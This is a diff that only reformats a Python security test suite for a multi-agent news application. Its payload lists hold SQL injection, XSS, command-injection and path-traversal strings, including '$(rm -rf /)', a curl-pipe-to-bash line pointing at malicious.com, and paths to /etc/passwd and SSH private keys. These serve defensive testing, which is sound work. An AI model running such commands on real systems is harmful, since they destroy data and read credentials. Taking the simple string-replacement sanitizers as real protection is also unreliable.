@@ -37,12 +37,12 @@ class TestInputValidation:
             "' OR '1'='1",
             "'; SELECT * FROM users; --",
             "admin'--",
-            "1' OR '1' = '1"
+            "1' OR '1' = '1",
         ]
 
         for payload in malicious_payloads:
             # Test against memory agent (database operations)
-            with patch('agents.memory.main.query_articles') as mock_query:
+            with patch("agents.memory.main.query_articles") as mock_query:
                 mock_query.return_value = []
 
                 # Attempt injection
@@ -63,12 +63,12 @@ class TestInputValidation:
             "<img src=x onerror=alert('xss')>",
             "javascript:alert('xss')",
             "<iframe src='javascript:alert(\"xss\")'>",
-            "<svg onload=alert('xss')>"
+            "<svg onload=alert('xss')>",
         ]
 
         for payload in xss_payloads:
             # Test against synthesizer agent (text processing)
-            with patch('agents.synthesizer.main.generate_summary') as mock_generate:
+            with patch("agents.synthesizer.main.generate_summary") as mock_generate:
                 mock_generate.return_value = {"summary": "Safe summary"}
 
                 result = await self._attempt_xss_injection(payload)
@@ -90,12 +90,12 @@ class TestInputValidation:
             "| cat /etc/passwd",
             "`whoami`",
             "$(rm -rf /)",
-            "; curl malicious.com/script.sh | bash"
+            "; curl malicious.com/script.sh | bash",
         ]
 
         for payload in injection_payloads:
             # Test against crawler agent (system command execution)
-            with patch('agents.crawler.main.execute_crawl') as mock_crawl:
+            with patch("agents.crawler.main.execute_crawl") as mock_crawl:
                 mock_crawl.return_value = {"status": "completed"}
 
                 result = await self._attempt_command_injection(payload)
@@ -117,7 +117,7 @@ class TestInputValidation:
 
         for large_input in large_inputs:
             # Test against analyst agent (text analysis)
-            with patch('agents.analyst.main.analyze_text') as mock_analyze:
+            with patch("agents.analyst.main.analyze_text") as mock_analyze:
                 mock_analyze.return_value = {"sentiment": "neutral"}
 
                 result = await self._attempt_large_input(large_input)
@@ -136,18 +136,21 @@ class TestInputValidation:
             "..\\..\\..\\windows\\system32\\config\\sam",
             "/etc/passwd",
             "C:\\Windows\\System32\\config\\sam",
-            "../../../../root/.ssh/id_rsa"
+            "../../../../root/.ssh/id_rsa",
         ]
 
         for payload in traversal_payloads:
             # Test against file operations
-            with patch('builtins.open') as mock_open:
+            with patch("builtins.open") as mock_open:
                 mock_open.side_effect = FileNotFoundError()
 
                 result = await self._attempt_path_traversal(payload)
 
                 # Verify traversal was prevented
-                assert isinstance(result.get("error"), str) or "not found" in str(result).lower()
+                assert (
+                    isinstance(result.get("error"), str)
+                    or "not found" in str(result).lower()
+                )
 
     async def _attempt_sql_injection(self, payload: str) -> dict[str, Any]:
         """Attempt SQL injection"""
@@ -160,7 +163,7 @@ class TestInputValidation:
             return {
                 "articles": [],
                 "query": "[sanitized]",
-                "error": "Potential SQL injection detected"
+                "error": "Potential SQL injection detected",
             }
 
         return {"articles": [], "query": normalized}
@@ -173,10 +176,7 @@ class TestInputValidation:
         sanitized = sanitized.replace("onerror", "[blocked]")
         sanitized = sanitized.replace("onload", "[blocked]")
 
-        return {
-            "summary": f"Safe processing of: {sanitized}",
-            "sanitized": True
-        }
+        return {"summary": f"Safe processing of: {sanitized}", "sanitized": True}
 
     async def _attempt_command_injection(self, payload: str) -> dict[str, Any]:
         """Attempt command injection"""
@@ -213,7 +213,7 @@ class TestAuthenticationSecurity:
         for api_key in valid_keys + invalid_keys:
             is_valid = api_key in valid_keys
 
-            with patch('agents.common.auth.validate_api_key') as mock_validate:
+            with patch("agents.common.auth.validate_api_key") as mock_validate:
                 mock_validate.return_value = is_valid
 
                 result = await self._test_api_access(api_key)
@@ -236,12 +236,16 @@ class TestAuthenticationSecurity:
             results = await self._simulate_request_rate(rpm)
 
             # Check rate limiting behavior
-            denied_requests = len([r for r in results if r.get("status") == "rate_limited"])
+            denied_requests = len(
+                [r for r in results if r.get("status") == "rate_limited"]
+            )
 
             if rpm > 60:  # Assuming 60 requests per minute limit
                 assert denied_requests > 0, f"Rate limiting not working for {rpm} rpm"
             else:
-                assert denied_requests == 0, f"Rate limiting too aggressive for {rpm} rpm"
+                assert denied_requests == 0, (
+                    f"Rate limiting too aggressive for {rpm} rpm"
+                )
 
     @pytest.mark.asyncio
     @pytest.mark.security
@@ -250,9 +254,21 @@ class TestAuthenticationSecurity:
         # Test session creation, validation, and expiration
         session_tests = [
             {"action": "create", "expected": "session_created"},
-            {"action": "validate", "session_id": "valid_session_123", "expected": "valid"},
-            {"action": "validate", "session_id": "invalid_session", "expected": "invalid"},
-            {"action": "expire", "session_id": "valid_session_123", "expected": "expired"}
+            {
+                "action": "validate",
+                "session_id": "valid_session_123",
+                "expected": "valid",
+            },
+            {
+                "action": "validate",
+                "session_id": "invalid_session",
+                "expected": "invalid",
+            },
+            {
+                "action": "expire",
+                "session_id": "valid_session_123",
+                "expected": "expired",
+            },
         ]
 
         for test_case in session_tests:
@@ -287,7 +303,9 @@ class TestAuthenticationSecurity:
             results.append({"status": status})
         return results
 
-    async def _test_session_operation(self, test_case: dict[str, Any]) -> dict[str, Any]:
+    async def _test_session_operation(
+        self, test_case: dict[str, Any]
+    ) -> dict[str, Any]:
         """Test session operation"""
         action = test_case["action"]
         if action == "create":
@@ -318,7 +336,7 @@ class TestDataProtection:
             "user_password_hash",
             "api_keys_encrypted",
             "personal_information",
-            "financial_data"
+            "financial_data",
         ]
 
         for data in sensitive_data:
@@ -343,12 +361,17 @@ class TestDataProtection:
         test_payloads = [
             {"type": "authentication", "data": "user_credentials"},
             {"type": "article_content", "data": "Large article text..."},
-            {"type": "analysis_result", "data": {"sentiment": "positive", "score": 0.95}}
+            {
+                "type": "analysis_result",
+                "data": {"sentiment": "positive", "score": 0.95},
+            },
         ]
 
         for payload in test_payloads:
             # Simulate encrypted transmission
-            encrypted_transmission = await self._simulate_encrypted_transmission(payload)
+            encrypted_transmission = await self._simulate_encrypted_transmission(
+                payload
+            )
 
             # Verify encryption in transit
             assert encrypted_transmission.get("encrypted") is True
@@ -364,7 +387,7 @@ class TestDataProtection:
             "john.doe@email.com",
             "123-45-6789",  # SSN
             "555-123-4567",  # Phone
-            "123 Main St, Anytown, USA 12345"
+            "123 Main St, Anytown, USA 12345",
         ]
 
         for pii in pii_data:
@@ -373,7 +396,9 @@ class TestDataProtection:
 
             # Verify PII was masked/handled appropriately
             assert processed != pii  # Data should be transformed
-            assert "MASKED" in processed or "*" in processed or processed == "[REDACTED]"
+            assert (
+                "MASKED" in processed or "*" in processed or processed == "[REDACTED]"
+            )
 
     async def _encrypt_data(self, data: str) -> str:
         """Encrypt data"""
@@ -387,19 +412,21 @@ class TestDataProtection:
         suffix = "_end"
 
         if encrypted.startswith(prefix):
-            encrypted = encrypted[len(prefix):]
+            encrypted = encrypted[len(prefix) :]
         if encrypted.endswith(suffix):
-            encrypted = encrypted[:-len(suffix)]
+            encrypted = encrypted[: -len(suffix)]
 
         return encrypted
 
-    async def _simulate_encrypted_transmission(self, payload: dict[str, Any]) -> dict[str, Any]:
+    async def _simulate_encrypted_transmission(
+        self, payload: dict[str, Any]
+    ) -> dict[str, Any]:
         """Simulate encrypted data transmission"""
         return {
             "encrypted": True,
             "tls_version": "1.3",
             "cipher_suite": "TLS_AES_256_GCM_SHA384",
-            "payload_size": len(str(payload))
+            "payload_size": len(str(payload)),
         }
 
     async def _process_pii_data(self, data: str) -> str:
@@ -430,7 +457,7 @@ class TestAPISecurity:
             "https://justnews.com",
             "https://app.justnews.com",
             "https://malicious-site.com",
-            "http://localhost:3000"
+            "http://localhost:3000",
         ]
 
         allowed_origins = ["https://justnews.com", "https://app.justnews.com"]
@@ -453,7 +480,7 @@ class TestAPISecurity:
             {"field": "query", "value": "<script>alert('xss')</script>"},
             {"field": "filename", "value": "../../../../etc/passwd"},
             {"field": "sql", "value": "'; DROP TABLE users; --"},
-            {"field": "html", "value": "<img src=x onerror=alert(1)>"}
+            {"field": "html", "value": "<img src=x onerror=alert(1)>"},
         ]
 
         for input_data in malicious_inputs:
@@ -470,7 +497,7 @@ class TestAPISecurity:
         allowed_origins = ["https://justnews.com", "https://app.justnews.com"]
         return {
             "allowed": origin in allowed_origins,
-            "credentials": "true" if origin in allowed_origins else "false"
+            "credentials": "true" if origin in allowed_origins else "false",
         }
 
     async def _sanitize_input(self, input_data: dict[str, Any]) -> dict[str, Any]:
@@ -480,6 +507,11 @@ class TestAPISecurity:
         if "value" in sanitized:
             value = sanitized["value"]
             # Remove dangerous patterns
-            value = value.replace("<script>", "").replace("DROP TABLE", "").replace("onerror", "").replace("../", "")
+            value = (
+                value.replace("<script>", "")
+                .replace("DROP TABLE", "")
+                .replace("onerror", "")
+                .replace("../", "")
+            )
             sanitized["value"] = value
         return sanitized
